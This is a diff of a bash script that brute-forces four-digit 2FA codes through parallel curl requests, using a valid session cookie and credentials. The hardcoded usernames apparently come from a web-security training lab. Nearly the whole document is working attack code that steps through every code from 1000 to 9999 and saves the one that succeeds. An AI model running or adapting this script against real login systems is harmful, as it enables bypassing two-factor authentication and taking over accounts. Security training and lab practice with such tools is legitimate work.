@@ -3,16 +3,16 @@
 # Brute-force 2FA code, with correct credentials
 # Valid code found via "cat valid_code"
 
-username=$1
-password=$2
-url=$3
+username="carlos"
+# password=$2
+url=$1
 threads=200 # Sets as needed
 
 
 find . -name "*_response" -exec rm {} \; # Remove Unecessary files if exist
 
 send_code() { # The launcher function
-	curl -s -o $5  -X POST -b "verify=$1" -b "session=$4" -d "mfa-code=$6" $3
+	curl -s -o $5  -X POST -b "verify=$1" -b "session=$3" -d "mfa-code=$4" $2
 }
 
 get_session() {
@@ -24,26 +24,26 @@ running_jobs() {
 }
 
 execute() {
-	send_code "$1" "$2" "$3" "$4" "$5_response" "$5" &&
-	if ! cat $5_response | grep -q "Incorrect"; then # For disable output use: "grep -q "Incorrect"
-		echo "[!] Found code: $5"
-		echo "$5" > valid_code
+	send_code "$1" "$2" "$3" "$4" "$4_response" &&
+	if cat $4_response | grep -q "Incorrect"; then # For disable {curl} output use: "grep -q "Incorrect"
+		echo "[*] $4 Not valid" # Comment the line to hide output
+		rm $4_response
 
 	else
-		echo "$5 Not valid" # Comment the line to hide output
-		rm $5_response
+		echo "[!] Found code: $4"
+		echo "$4" > valid_code
 	fi
 }
 
 url_code="$url"2 # URL for 2FA page
-get_session "$username" "$password" "$url" # Set session cookies to session file
+get_session "wiener" "peter" "$url" # Set session cookies to session file
 session=$(cat session)
 for i in $(seq 1000 9999); do
 	echo "i: $i"
 	while [ "$(running_jobs)" -gt "$threads" ]; do # Threading limits
 		sleep 0.1
 	done
-	execute "$username" "$password" "$url_code" "$session" "$i" &
+	execute "$username" "$url_code" "$session" "$i" &
 	[ -f valid_code ] && break # End process if code found
 done
 
